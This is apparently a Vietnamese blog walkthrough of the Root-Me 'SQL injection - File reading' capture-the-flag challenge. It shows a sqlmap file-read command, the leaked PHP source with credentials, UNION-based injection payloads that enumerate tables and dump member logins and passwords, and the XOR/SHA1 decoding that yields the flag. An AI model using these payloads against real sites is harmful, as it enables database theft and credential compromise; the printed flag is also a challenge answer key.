---
template: overrides/blog.html
icon: material/plus-circle
title: SQL injection - File reading
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
    - SQL Injection 
---

# __SQL injection - File reading__

<span>
:octicons-calendar-24: May 03, 2023

</span>

---


## __Tài nguyên và link challenge__

Tài nguyên của challenge này tại [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-file-reading](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-file-reading)

Link challenge này tại [:octicons-arrow-right-24: http://challenge01.root-me.org/web-serveur/ch31/][http://challenge01.root-me.org/web-serveur/ch31/]

  [http://challenge01.root-me.org/web-serveur/ch31/]: http://challenge01.root-me.org/web-serveur/ch31/

## __Tổng quan__

Trong challenge này, mục tiêu của ta là lấy được password admin.

## __Kịch bản tấn công__
### Bước 1: Kiểm tra website

Challenge này cung cấp cho ta 2 website: 1 cho việc login tài khoản, 1 cho việc xem thành viên (trang Members).

### Bước 2: Khai thác website

Well, nhìn đề bài ta cào source code bằng sqlmap cho nhanh. Xem nó ra gì ::)
Dùng lệnh `python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --file-read=/challenge/web-serveur/ch31/index.php` để xem sourcecode

<div class="result" markdown>

``` php linenums="1" hl_lines="21 39 45"
<html>
<header><title>SQL injection - FILE</title></header>
<body>
<h3><a href="?action=login">Authentication</a>&nbsp;|&nbsp;<a href="?action=members">Members</a></h3><hr />

<?php

define('SQL_HOST',      '/var/run/mysqld/mysqld3-web-serveur-ch31.sock');
define('SQL_DB',        'c_webserveur_31');
define('SQL_LOGIN',     'c_webserveur_31');
define('SQL_P',         'dOJLsrbyas3ZdrNqnhx');


function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}

$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
 

$GLOBALS["___mysqli_ston"] = mysqli_connect('', SQL_LOGIN, SQL_P, "", 0, SQL_HOST) or exit('mysql connection error !');
mysqli_select_db($GLOBALS["___mysqli_ston"], SQL_DB) or die("Database selection error !");

if ( ! isset($_GET['action']) ) $_GET['action']="login";

if($_GET['action'] == "login"){
        print '<form METHOD="POST">
                <p><label style="display:inline-block;width:100px;">Login : </label><input type="text" name="username" /></p>
                <p><label style="display:inline-block;width:100px;">Password : </label><input type="password" name="password" /></p>
                <p><input value=submit type=submit /></p>
                </form>';

	if(isset($_POST['username'], $_POST['password']) && !empty($_POST['username']) && !empty($_POST['password']))
	{
		$user = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], strtolower($_POST['username']));
		$pass = sha1($_POST['password']);
		
		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT member_password FROM member WHERE member_login='".$user."'");
		if(mysqli_num_rows($result) == 1)
		{
			$data = mysqli_fetch_array($result);
			if($pass == stringxor($key, base64_decode($data['member_password']))){
                                // authentication success
                                print "<p>Authentication success !!</p>";
                                if ($user == "admin")
                                    print "<p>Yeah !!! You're admin ! Use this password to complete this challenge.</p>";
                                else 
                                    print "<p>But... you're not admin !</p>";
			}
			else{
                                // authentication failed
				print "<p>Authentication failed !</p>";
			}
		}
		else{
			print "<p>User not found !</p>";
		}
	}
}

if($_GET['action'] == "members"){
	if(isset($_GET['id']) && !empty($_GET['id']))
	{
                // secure ID variable
		$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_GET['id']);
		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member WHERE member_id=$id") or die(mysqli_error($GLOBALS["___mysqli_ston"]));
		
		if(mysqli_num_rows($result) == 1)
		{
			$data = mysqli_fetch_array($result);
			print "ID : ".$data["member_id"]."<br />";
			print "Username : ".$data["member_login"]."<br />";
			print "Email : ".$data["member_email"]."<br />";	
		}
                else{
                        print "no result found";
                }
	}
	else{
		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member");
		while ($row = mysqli_fetch_assoc($result)) {
			print "<p><a href=\"?action=members&id=".$row['member_id']."\">".$row['member_login']."</a></p>";
		}
	}
}

?>
</body>
</html>
```

</div>
Với source code trên ta nhặt được một vài thứ quan trọng:

- Đầu tiên, chúng ta có 1 biến key
- Thứ hai, password đã được mã hóa SHA1
- Cuối cùng, ta có hàm stringxor để thực hiện việc xor giá trị của key và base64_decode(password_in_db) và so sánh với SHA1(password_input).

Thế thì chúng ta nên làm gì tiếp theo đây? Đi tìm password thôi nào.

Quay lại, challenge này nhìn vào giống tựa như bài [SQL injection - Numeric](/rootme/web-server/sql-injection/sql-injection-numeric).
Đầu tiên, ta fuzz URL để tìm số cột của table và nhận được 4 cột (thông qua payload `order by 5--`)

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-file-reading-02.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả tiêm payload vào URL</figcaption>
</figure>

Hoặc ta có thể kiểm tra bằng `..&id=1 union select 1,1,1,1--` 

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-file-reading-01.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả tiêm payload vào URL</figcaption>
</figure>

Tiếp theo, ta sẽ xem các vị trí cột có thể khai thác bằng `-1 union select 1,2,3,4--`

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-file-reading-03.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả tiêm payload vào URL</figcaption>
</figure>

Well, ta có cột 1, 2 và 4 có thể khai thác
Tiếp theo, ta sẽ tìm danh sách các bảng bằng `-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema = database()--`
ta thấy có được bảng member

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-file-reading-04.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả tiêm payload vào URL</figcaption>
</figure>

Roài, tiếp theo ta sẽ chọn và khai thác table member bằng `-1 union select 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 0x6d656d626572--`

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-file-reading-05.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả tiêm payload vào URL</figcaption>
</figure>

Rồi, ở đây ta chỉ quan tâm đến cột member_login và member_password bằng `-1 union select 1,2,3,group_concat(member_login,member_password) from member--`

<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-file-reading-06.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả tiêm payload vào URL</figcaption>
</figure>

Ta nhận được một chuỗi mã hóa `VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==`. Công việc của ta là login thui nào

### Bước 3: Khai thác password

Rồi tiếp theo ta xem lại đoạn code đã khai thác từ trước, ta tiến hành giải mã password. Ta nhận được:
- password_encrypt = VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==
- key = c92fcd618967933ac463feb85ba00d5a7ae52842

Hơn nữa ta có: key xor password_encrypt = SHA1(password_input) :octicons-arrow-right-24: SHA1(password_input) = key xor password_encrypt. Rồi từ đây ta sẽ tiến hành tìm SHA1(password_input).
 
<figure markdown>
  ![Image title](/rootme/web-server/sql-injection/images/sql-injection-file-reading-07.png#zoom)
  <figcaption>Hình ảnh mô tả kết quả SHA1(password_input)</figcaption>
</figure>

Well, ta được SHA1(password_input) = `77be4fc97f77f5f48308942bb6e32aacabed9cef`. Decrypt ta được password = `superpassword`

!!! success "__Flag__"
    superpassword
